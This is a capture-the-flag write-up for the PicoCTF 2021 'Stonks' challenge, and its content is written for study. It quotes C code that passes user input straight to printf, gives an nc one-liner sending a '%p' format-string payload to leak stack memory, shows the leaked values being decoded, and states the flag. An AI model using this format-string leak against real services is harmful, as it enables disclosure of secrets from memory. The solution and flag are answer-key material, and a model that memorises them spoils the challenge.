# PicoCTF2021 - Stonks

## Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](./vuln.c) ```nc mercury.picoctf.net 59616```

## Solution
1. Read through ```vuln.c``` and found a potentially vulnerable section that took unfiltered user input after running ```buy_stonks``` function:
```
  char *user_buf = malloc(300 + 1);
  printf("What is your API token?\n");
  scanf("%300s", user_buf);
  printf("Buying stonks with token:\n");
  printf(user_buf);
```
2. Selected buy option to then print out numerous pointer addresses by running: ```{ echo "1"; python3 -c "print('%p' * 300)"; } | nc mercury.picoctf.net 59616```
3. Pasted the shown pointer addresses into [extracted_addresses.txt](./extracted_addresses.txt)
4. Used custom script ```hex_parse.py``` to parse ```extracted_addresses.txt``` to filtered hex values into [parsed_addresses.txt](./parsed_addresses.txt)
5. Copied the parsed hex values into [CyberChef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&input=MDllNTIzNzAgMDgwNGIwMDAgMDgwNDg5YzMgZjdmOWZkODAgZmZmZmZmZmYgMDAwMDAwMDEgMDllNTAxNjAgZjdmYWQxMTAgZjdmOWZkYzcgMDllNTExODAgMDAwMDAwMDQgMDllNTIzNTAgMDllNTIzNzAgNmY2MzY5NzAgN2I0NjU0NDMgMzA2YzVmNDkgMzQ1Zjc0MzUgNmQ1ZjZjNmMgMzA2ZDVmNzkgNWY3OTMzNmUgMzgzNDMxMzYgMzQzNTY1NjIgZmZhZjAwN2QgZjdmZGFhZjggZjdmYWQ0NDAgZDE2N2QwMDAgMDAwMDAwMDEgZjdlM2NjZTkgZjdmYWUwYzAgZjdmOWY1YzAgZjdmOWYwMDAgZmZhZjVjODggZjdlMmQ2OGQgZjdmOWY1YzAgMDgwNDhlY2EgZmZhZjVjOTQgZjdmYzFmMDkgMDgwNGIwMDAgZjdmOWYwMDAgZjdmOWZlMjAgZmZhZjVjYzggZjdmYzdkNTAgZjdmYTA4OTAgZDE2N2QwMDAgZjdmOWYwMDAgMDgwNGIwMDAgZmZhZjVjYzggMDgwNDhjODYgMDllNTAxNjAgZmZhZjVjYjQgZmZhZjVjYzggMDgwNDhiZTkgZjdmOWYzZmMgZmZhZjVkN2MgZmZhZjVkNzQgMDAwMDAwMDEgMDAwMDAwMDEgMDllNTAxNjAgZDE2N2QwMDAgZmZhZjVjZTAgZjdkZTJmYTEgZjdmOWYwMDAgZjdmOWYwMDAgZjdkZTJmYTEgMDAwMDAwMDEgZmZhZjVkNzQgZmZhZjVkN2MgZmZhZjVkMDQgMDAwMDAwMDEgZjdmOWYwMDAgZjdmYzI3MGEgZjdmZGEwMDAgZjdmOWYwMDAgNGI4NTM5NzAgYTk2MjNmNjAgMDAwMDAwMDEgMDgwNDg2MzAgZjdmYzdkNTAgZjdmYzI5NjAgMDgwNGIwMDAgMDAwMDAwMDEgMDgwNDg2MzAgMDgwNDg2NjIgMDgwNDhiODUgMDAwMDAwMDEgZmZhZjVkNzQgMDgwNDhjZDAgMDgwNDhkMzAgZjdmYzI5NjAgZmZhZjVkNmMgZjdmZGE5NDAgMDAwMDAwMDEgZmZhZjVlNzYgZmZhZjVlYWYgZmZhZjVlYmMgZmZhZjVlYzUgZmZhZjVlZjQgZmZhZjVmMmMgZmZhZjVmNDggZmZhZjVmNmIgZmZhZjVmNzMgMDAwMDAwMjAgZjdmYjJiNTAgMDAwMDAwMjEgZjdmYjIwMDAgMDAwMDAwMTAgMWY4YmZiZmYgMDAwMDAwMDYgMDAwMDEwMDAgMDAwMDAwMTEgMDAwMDAwNjQgMDAwMDAwMDMgMDgwNDgwMzQgMDAwMDAwMDQgMDAwMDAwMjAgMDAwMDAwMDUgMDAwMDAwMDkgMDAwMDAwMDcgZjdmYjMwMDAgMDAwMDAwMDggMDAwMDAwMDkgMDgwNDg2MzAgMDAwMDAwMGIgMDAwMDA0MTAgMDAwMDAwMGMgMDAwMDA0MTAgMDAwMDAwMGQgMDAwMDA0MTEgMDAwMDAwMGUgMDAwMDA0MTEgMDAwMDAwMTc&oeol=NEL) to swap endianness and decode from hex

## Flag
picoCTF{I_l05t_4ll_my_m0n3y_6148be54}